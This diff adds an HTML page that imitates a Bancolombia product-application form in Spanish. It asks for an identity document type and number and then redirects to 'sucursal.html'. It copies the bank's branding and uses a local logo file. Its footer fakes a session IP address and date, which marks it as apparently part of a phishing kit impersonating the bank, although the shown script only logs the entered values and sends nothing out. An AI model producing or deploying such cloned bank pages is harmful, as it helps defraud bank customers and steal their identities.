@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bancolombia - Solicitud de Producto</title>
+    
+    <!-- Fuente Open Sans -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Open Sans', sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* Header */
+        .header {
+            background-color: #2d2d2d;
+            color: white;
+            padding: 16px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: relative;
+            border-bottom: 3px solid #FDDA24;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.15);
+        }
+
+        .back-button {
+            display: flex;
+            align-items: center;
+            color: white;
+            text-decoration: none;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: 400;
+            gap: 4px;
+        }
+
+        .back-button::before {
+            content: "‹";
+            font-size: 32px;
+            font-weight: 300;
+            line-height: 1;
+        }
+
+        .header-logo {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            height:70px;
+            filter: brightness(0) invert(1);
+        }
+
+        .exit-button {
+            color: white;
+            text-decoration: none;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            font-weight: 400;
+            gap: 4px;
+        }
+
+        .exit-button::after {
+            content: "›";
+            font-size: 32px;
+            font-weight: 300;
+            line-height: 1;
+        }
+
+        /* Main Content */
+        .main-wrapper {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            padding: 0 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 440px;
+            padding: 48px 0;
+        }
+
+        .title {
+            color: #212121;
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 40px;
+            line-height: 1.3;
+            letter-spacing: -0.2px;
+        }
+
+        /* Form */
+        .form-group {
+            margin-bottom: 32px;
+        }
+
+        .form-label {
+            display: block;
+            color: #757575;
+            font-size: 13px;
+            margin-bottom: 10px;
+            font-weight: 400;
+        }
+
+        .select-wrapper {
+            position: relative;
+            margin-bottom: 0;
+        }
+
+        .form-select {
+            width: 100%;
+            padding: 14px 40px 14px 40px;
+            border: none;
+            border-bottom: 1px solid #333;
+            font-size: 16px;
+            background-color: white;
+            appearance: none;
+            cursor: pointer;
+            font-weight: 600;
+            color: #212121;
+            font-family: 'Open Sans', sans-serif;
+        }
+
+        .form-select:focus {
+            outline: none;
+            border-bottom: 2px solid #FDDA24;
+        }
+
+        .select-wrapper::before {
+            content: "";
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 24px;
+            height: 24px;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="%23666" stroke-width="1.8"><rect x="3" y="5" width="18" height="14" rx="2" ry="2"/><circle cx="9" cy="10.5" r="2"/><path d="M6 16c0-1.5 1.3-2.5 3-2.5s3 1 3 2.5"/><line x1="14" y1="9" x2="18" y2="9"/><line x1="14" y1="12" x2="18" y2="12"/><line x1="14" y1="15" x2="16" y2="15"/></svg>');
+            background-size: contain;
+            background-repeat: no-repeat;
+        }
+
+        .select-wrapper::after {
+            content: "";
+            position: absolute;
+            right: 14px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 0;
+            height: 0;
+            border-left: 5px solid transparent;
+            border-right: 5px solid transparent;
+            border-top: 6px solid #757575;
+            pointer-events: none;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 14px 40px 14px 40px;
+            border: none;
+            border-bottom: 1px solid #d32f2f;
+            font-size: 16px;
+            background-color: white;
+            font-family: 'Open Sans', sans-serif;
+            color: #212121;
+            font-weight: 400;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-bottom: 2px solid #212121;
+        }
+
+        .form-input.valid {
+            border-bottom: 1px solid #4caf50;
+        }
+
+        .input-wrapper::before {
+            content: "";
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 28px;
+            height: 28px;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="%23666" stroke-width="1.8"><rect x="3" y="5" width="18" height="14" rx="2" ry="2"/><circle cx="9" cy="10.5" r="2"/><path d="M6 16c0-1.5 1.3-2.5 3-2.5s3 1 3 2.5"/><line x1="14" y1="9" x2="18" y2="9"/><line x1="14" y1="12" x2="18" y2="12"/><line x1="14" y1="15" x2="16" y2="15"/></svg>');
+            background-size: contain;
+            background-repeat: no-repeat;
+        }
+
+        .error-message {
+            color: #d32f2f;
+            font-size: 13px;
+            margin-top: 8px;
+            display: block;
+            font-weight: 400;
+        }
+
+        .info-box {
+            display: flex;
+            align-items: flex-start;
+            background-color: #f5f5f5;
+            padding: 14px 16px;
+            border-radius: 4px;
+            margin-top: 14px;
+        }
+
+        .info-icon {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #9e9e9e;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            flex-shrink: 0;
+            font-weight: 600;
+            color: #9e9e9e;
+            font-size: 13px;
+            font-family: serif;
+            font-style: italic;
+        }
+
+        .info-text {
+            color: #424242;
+            font-size: 13px;
+            line-height: 1.6;
+            font-weight: 400;
+        }
+
+        /* Checkbox */
+        .checkbox-container {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 32px;
+        }
+
+        .checkbox-input {
+            width: 20px;
+            height: 20px;
+            margin-right: 12px;
+            margin-top: 1px;
+            cursor: pointer;
+            flex-shrink: 0;
+            accent-color: #FDDA24;
+        }
+
+        .checkbox-label {
+            font-size: 13px;
+            color: #424242;
+            line-height: 1.65;
+            font-weight: 400;
+        }
+
+        .checkbox-label a {
+            color: #212121;
+            text-decoration: underline;
+            font-weight: 700;
+        }
+
+        /* Button */
+        .btn-siguiente {
+            width: 100%;
+            padding: 14px 32px;
+            border-radius: 24px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: not-allowed;
+            border: none;
+            background-color: #e0e0e0;
+            color: #9e9e9e;
+            transition: all 0.2s ease;
+            font-family: 'Open Sans', sans-serif;
+        }
+
+        .btn-siguiente.active {
+            background-color: #FDDA24;
+            color: #212121;
+            cursor: pointer;
+        }
+
+        .btn-siguiente.active:hover {
+            background-color: #FDD007;
+        }
+
+        /* Footer */
+        .footer {
+            background-color: #2d2d2d;
+            color: white;
+            padding: 24px 32px;
+            margin-top: auto;
+        }
+
+        .footer-content {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+        }
+
+        .footer-left {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .footer-logo {
+            height: 130px;
+            margin-bottom: -50px;
+            display: block;
+            filter: brightness(0) invert(1);
+            transform: scale(0.5);
+            transform-origin: left top;
+            margin-left: -5px;
+        }
+
+        .footer-copyright {
+            font-size: 12px;
+            color: #e0e0e0;
+            margin-bottom: 12px;
+            font-weight: 400;
+        }
+
+        .footer-badges {
+            display: flex;
+            gap: 8px;
+            margin-top: 4px;
+            align-items: center;
+        }
+
+        .badge {
+            background-color: white;
+            padding: 4px 8px;
+            border-radius: 3px;
+            font-size: 8px;
+            color: #212121;
+            font-weight: 700;
+            letter-spacing: 0.3px;
+            white-space: nowrap;
+        }
+
+        .footer-right {
+            text-align: right;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+        }
+
+        .footer-ip {
+            font-size: 12px;
+            color: #e0e0e0;
+            margin-bottom: 4px;
+            font-weight: 400;
+        }
+
+        .footer-date {
+            font-size: 12px;
+            color: #e0e0e0;
+            font-weight: 400;
+        }
+
+        /* RESPONSIVE MOBILE */
+        @media (max-width: 768px) {
+            .header {
+                padding: 10px 16px;
+            }
+
+            .header-logo {
+                height: 40px;
+            }
+
+            .back-button, .exit-button {
+                font-size: 13px;
+            }
+
+            .back-button::before, .exit-button::after {
+                font-size: 24px;
+            }
+
+            .main-wrapper {
+                padding: 0 20px;
+            }
+
+            .container {
+                padding: 20px 0;
+                max-width: 100%;
+            }
+
+            .title {
+                font-size: 18px;
+                margin-bottom: 20px;
+                line-height: 1.4;
+                word-wrap: break-word;
+            }
+
+            .form-group {
+                margin-bottom: 20px;
+            }
+
+            .form-label {
+                font-size: 11px;
+                margin-bottom: 6px;
+                color: #666;
+            }
+
+            .form-select, .form-input {
+                padding: 10px 36px 10px 36px;
+                font-size: 13px;
+            }
+
+            .select-wrapper::before {
+                width: 18px;
+                height: 18px;
+                left: 8px;
+            }
+
+            .input-wrapper::before {
+                width: 18px;
+                height: 18px;
+                left: 8px;
+            }
+
+            .select-wrapper::after {
+                border-left: 4px solid transparent;
+                border-right: 4px solid transparent;
+                border-top: 5px solid #757575;
+            }
+
+            .error-message {
+                font-size: 11px;
+                margin-top: 4px;
+            }
+
+            .info-box {
+                padding: 10px 12px;
+                margin-top: 10px;
+            }
+
+            .info-icon {
+                width: 16px;
+                height: 16px;
+                font-size: 11px;
+                margin-right: 8px;
+                border: 1.5px solid #9e9e9e;
+            }
+
+            .info-text {
+                font-size: 11px;
+                line-height: 1.4;
+            }
+
+            .checkbox-container {
+                margin-bottom: 20px;
+            }
+
+            .checkbox-input {
+                width: 16px;
+                height: 16px;
+                margin-right: 8px;
+                margin-top: 0;
+            }
+
+            .checkbox-label {
+                font-size: 11px;
+                line-height: 1.5;
+            }
+
+            .btn-siguiente {
+                padding: 12px 24px;
+                font-size: 14px;
+                margin-bottom: 0;
+            }
+
+            .footer {
+                padding: 16px 20px;
+                margin-top: 30px;
+            }
+
+            .footer-content {
+                flex-direction: column;
+                gap: 12px;
+            }
+
+            .footer-logo {
+                height: 60px;
+                margin-bottom: 8px;
+                transform: none;
+                margin-left: 0;
+            }
+
+            .footer-copyright {
+                font-size: 10px;
+                margin-bottom: 8px;
+            }
+
+            .footer-badges {
+                gap: 4px;
+                flex-wrap: wrap;
+            }
+
+            .badge {
+                padding: 2px 5px;
+                font-size: 6.5px;
+            }
+
+            .footer-right {
+                text-align: left;
+                align-items: flex-start;
+            }
+
+            .footer-ip, .footer-date {
+                font-size: 10px;
+            }
+
+            .footer-ip {
+                margin-bottom: 2px;
+            }
+        }
+
+        /* RESPONSIVE TABLETS */
+        @media (min-width: 481px) and (max-width: 768px) {
+            .title {
+                font-size: 20px;
+            }
+
+            .form-label {
+                font-size: 12px;
+            }
+
+            .form-select, .form-input {
+                font-size: 14px;
+            }
+
+            .checkbox-label {
+                font-size: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <a href="#" class="back-button">Volver</a>
+        <img src="image-removebg-preview.png" alt="Bancolombia" class="header-logo">
+        <a href="#" class="exit-button">Salir</a>
+    </header>
+
+    <div class="main-wrapper">
+        <main class="container">
+            <h1 class="title">¡Todo listo! Empecemos con tu número de documento</h1>
+
+            <form id="documentForm">
+                <!-- Tipo de documento -->
+                <div class="form-group">
+                    <label class="form-label">Tipo de documento de identidad</label>
+                    <div class="select-wrapper">
+                        <select class="form-select" id="documentType">
+                            <option value="cc" selected>Cédula de Ciudadanía</option>
+                            <option value="ce">Cédula de Extranjería</option>
+                            <option value="ti">Tarjeta de Identidad</option>
+                            <option value="pas">Pasaporte</option>
+                        </select>
+                    </div>
+                </div>
+
+                <!-- Número de documento -->
+                <div class="form-group">
+                    <label class="form-label">Número de documento</label>
+                    <div class="input-wrapper">
+                        <input 
+                            type="tel" 
+                            class="form-input" 
+                            id="documentNumber" 
+                            placeholder=""
+                            inputmode="numeric"
+                            pattern="[0-9]*"
+                            required
+                        >
+                    </div>
+                    <span class="error-message" id="errorMessage">Este campo es requerido</span>
+                    
+                    <div class="info-box">
+                        <div class="info-icon">i</div>
+                        <div class="info-text">
+                            Si tienes otro tipo de documento, acércate a la oficina más cercana para solicitar tu producto.
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Checkbox de autorización -->
+                <div class="checkbox-container">
+                    <input type="checkbox" class="checkbox-input" id="authCheckbox">
+                    <label class="checkbox-label" for="authCheckbox">
+                        Autorizo a Bancolombia para que el número de celular y el correo electrónico, sean tratados para contactarme y/o enviarme la información relacionada con la solicitud del producto. Igualmente para que me consulten ante Operadores de Información y Riesgo con el fin de verificar mi información personal. <a href="#">Términos, Condiciones y Políticas de Privacidad para la solicitud de productos.</a>
+                    </label>
+                </div>
+
+                <!-- Botón siguiente -->
+                <button type="submit" class="btn-siguiente" id="btnSiguiente">
+                    Siguiente
+                </button>
+            </form>
+        </main>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-left">
+               <img src="image-removebg-preview.png" alt="Bancolombia" class="footer-logo">
+                <div class="footer-copyright">Copyright © 2026 Bancolombia S.A.</div>
+                <div class="footer-badges">
+                    <span class="badge">VIGILADO</span>
+                    <span class="badge">SUPERINTENDENCIA FINANCIERA DE COLOMBIA</span>
+                </div>
+            </div>
+            <div class="footer-right">
+                <div class="footer-ip">Dirección IP 167.0.64.229</div>
+                <div class="footer-date">jueves 15 de enero de 2026, 12:12:00 a. m.</div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        const documentInput = document.getElementById('documentNumber');
+        const errorMessage = document.getElementById('errorMessage');
+        const authCheckbox = document.getElementById('authCheckbox');
+        const btnSiguiente = document.getElementById('btnSiguiente');
+        const documentForm = document.getElementById('documentForm');
+
+        // Permitir solo números en el campo de documento
+        documentInput.addEventListener('input', function(e) {
+            // Eliminar cualquier carácter que no sea número
+            this.value = this.value.replace(/[^0-9]/g, '');
+            
+            if (this.value.trim() !== '') {
+                errorMessage.style.display = 'none';
+                this.classList.add('valid');
+                this.style.borderBottomColor = '#4caf50';
+            } else {
+                errorMessage.style.display = 'block';
+                this.classList.remove('valid');
+                this.style.borderBottomColor = '#d32f2f';
+            }
+            updateButtonState();
+        });
+
+        // Prevenir entrada de caracteres no numéricos
+        documentInput.addEventListener('keypress', function(e) {
+            // Permitir solo números (códigos 48-57)
+            if (e.which < 48 || e.which > 57) {
+                e.preventDefault();
+            }
+        });
+
+        // Prevenir pegar texto que no sea numérico
+        documentInput.addEventListener('paste', function(e) {
+            e.preventDefault();
+            const pastedText = (e.clipboardData || window.clipboardData).getData('text');
+            const numbersOnly = pastedText.replace(/[^0-9]/g, '');
+            this.value = numbersOnly;
+            this.dispatchEvent(new Event('input'));
+        });
+
+        authCheckbox.addEventListener('change', updateButtonState);
+
+        function updateButtonState() {
+            if (documentInput.value.trim() !== '' && authCheckbox.checked) {
+                btnSiguiente.classList.add('active');
+                btnSiguiente.disabled = false;
+            } else {
+                btnSiguiente.classList.remove('active');
+                btnSiguiente.disabled = true;
+            }
+        }
+
+        documentForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            if (documentInput.value.trim() === '') {
+                errorMessage.style.display = 'block';
+                documentInput.style.borderBottomColor = '#d32f2f';
+            } else if (!authCheckbox.checked) {
+                alert('Por favor acepta los términos y condiciones');
+            } else {
+                console.log('Formulario enviado');
+                console.log('Tipo documento:', document.getElementById('documentType').value);
+                console.log('Número documento:', documentInput.value);
+                window.location.href = 'sucursal.html';
+            }
+        });
+
+        updateButtonState();
+    </script>
+</body>
+</html>
